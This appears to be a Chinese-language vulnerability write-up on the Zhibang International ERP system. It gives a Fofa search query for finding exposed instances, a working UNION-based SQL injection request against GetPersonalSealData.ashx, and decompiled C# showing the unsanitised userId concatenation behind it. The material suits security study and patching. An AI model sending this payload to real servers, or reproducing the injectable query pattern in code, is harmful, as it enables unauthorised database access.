## 智邦国际

```
Fofa语法:icon_hash="-682445886"
```

### 智邦国际目录结构



```
智邦国际    ├── API
          ├── SYSA
          ├── SYSC
          ├── SYSLogs
          ├── SYSN
          ├── Web.config
          ├── bin
          ├── bindecomplier
          ├── dll
          ├── mobilephone
```



Web.config部分内容如下

```
	</system.web> 
	<system.webServer>
		<defaultDocument>
			<files>
				<clear />
				<add value="default.html" />
				<add value="default.ashx" />
				<add value="default.aspx" />
				<add value="default.asp" />
			</files>
		</defaultDocument>
		<directoryBrowse enabled="false" />
		<security>
			<requestFiltering allowDoubleEscaping="true">
				<requestLimits maxAllowedContentLength="2147483647" maxQueryString="40800"></requestLimits>
				<fileExtensions>
					<remove fileExtension=".dll" />
					<remove fileExtension=".mdb" />
					<remove fileExtension=".xdb" />
					<remove fileExtension=".sql" />
					<add fileExtension=".dll" allowed="false" />
					<add fileExtension=".mdb" allowed="false" />
					<add fileExtension=".sql" allowed="false" />
					<add fileExtension=".xdb" allowed="false" />
				</fileExtensions>
			</requestFiltering>
		</security>
		<httpErrors errorMode="Detailed" />
		<staticContent>
			<remove fileExtension=".woff" />
			<remove fileExtension=".woff2" />
			<remove fileExtension=".apk" />
			<remove fileExtension=".json" />
			<remove fileExtension=".wgt" />
			<remove fileExtension=".dwg" />
			<remove fileExtension=".flv" />
			<mimeMap fileExtension=".json" mimeType="application/json" />
			<mimeMap fileExtension=".woff" mimeType="application/font-woff" />
			<mimeMap fileExtension=".woff2" mimeType="application/font-woff" />
			<mimeMap fileExtension=".apk" mimeType="application/vnd.android" />
			<mimeMap fileExtension=".wgt" mimeType="application/vnd.android" />
			<mimeMap fileExtension=".dwg" mimeType="application/x-autocad" />
			<mimeMap fileExtension=".flv" mimeType="flv-application/octet-stream" />
		</staticContent>

		<handlers>
			<add name="api" path="webapi/api/*" verb="*" type="ZBServices.webapi.API_Start.API_Start" />
			<add name="apiHelper" path="webapi/apiHelper/*" verb="*" type="ZBServices.webapi.API_Start.API_Helper" />
			<add name="apitest" path="webapi/apiTest/*" verb="*" type="ZBServices.view.SYSN.view.demo.test_webapi" />
			<add name="cdata" path="iclock/cdata" verb="*" type="ZBServices.view.SYSN.json.attendance.AttendanceDevAPI" />
			<add name="callcenter" path="webapi/callcenter/xfyx" verb="*" type="ZBServices.view.SYSN.json.callcenter.XianFengYinXunHandler" />
			<add name="getrequest" path="iclock/getrequest" verb="*" type="ZBServices.view.SYSN.json.attendance.AttendanceDevRequestOrder" />
			<add name="replyrequest" path="/iclock/devicecmd" verb="*" type="ZBServices.view.SYSN.json.attendance.AttendanceDevReplyOrder" />
			<add name="disallowresoure1" path="sysa/edit/upimages/uedit2*" verb="*" type="ZBServices.sdk.view.CommPage.DisAllowResouresPage" />
			<add name="disallowresoure2" path="sysa/reply/upload/*" verb="*" type="ZBServices.ui.PowerAllowResouresPage" />
			<add name="mobilelogin" path="SYSA/mobilephone/login.asp" verb="*" type="ZBServices.view.SYSN.view.init.MobileLogin" />
			<add name="AspCss_cskt" path="SYSA/inc/cskt.css" verb="*" type="ZBServices.sdk.RouteMap.CommApsCssRoute" />
		  <add name="AspCss_comm" path="SYSA/skin/default/css/comm.css" verb="*" type="ZBServices.sdk.RouteMap.CommApsCssRoute" />
			<add name="logoRoute" path="logo/pc/*/logo.png" verb="*" type="ZBServices.sdk.RouteMap.SystemPCLogoRoute" />
		</handlers>
        <asp enableParentPaths="true" />
	</system.webServer>
```



## 历史漏洞

### GetPersonalSealData sql注入

```
GET /SYSN/json/pcclient/GetPersonalSealData.ashx?imageDate=1&userId=-1%20union%20select%20@@version-- HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```



根据路由在文件夹中打开对应ashx文件找对应的编译之后的dll文件

```
├── attendance
├── callcenter
├── comm
├── mobile
├── mobilemap
├── mobilemapkeys.js
├── officeManage
├── payoutsure
├── pcclient
├── remind
├── sale
└── store
```

直接反编译一哈

```
// ZBServices.view.SYSN.json.pcclient.GetPersonalSealData
using System;
using Newtonsoft.Json;
using ZBServices;
using ZBServices.ui;
using ZBServices.view.SYSN.json.pcclient;

public class GetPersonalSealData : SesseionPage
{
	private class PersonalSealResultData
	{
		public string Image { get; set; }

		public string SealData { get; set; }
	}

	public override void OnNoUserLogin()
	{
	}

	protected override void Page_Load()
	{
		SetPageType("", SystemPageContentType.JSON);
		PersonalSealResultData personalSealResultData = new PersonalSealResultData();
		try
		{
			string text = base.Request.get_QueryString()["userId"];
			string text2 = base.Request.get_QueryString()["imageDate"];
			string text4 = (personalSealResultData.SealData = base.Request.get_QueryString()["sealData"]);
			string text5 = "";
			SQLClass currSql = SQLClass.CurrSql;
			text5 = "if exists(select 1 from setjm3 where ord=201207051 and num1=1)\r\n\t select top 1 data from erp_filedatas where title='" + text + "' and datediff(d,date,'" + text2 + "')>=0 and folder='私人章' order by date desc, id \r\nelse\r\n\tselect top 0 0 as data\r\n";
			object obj = null;
			try
			{
				obj = currSql.GetValue(text5);
			}
			catch (Exception)
			{
			}
			if (obj != null && obj is byte[] inArray)
			{
				string text7 = (personalSealResultData.Image = Convert.ToBase64String(inArray));
			}
			if (text4 == "")
			{
				string text9 = (personalSealResultData.SealData = currSql.GetValue("select name from gate where ord=" + text).IsNull("").ToString());
			}
			base.Response.Write(JsonConvert.SerializeObject(personalSealResultData));
		}
		catch (Exception)
		{
		}
	}
}
```

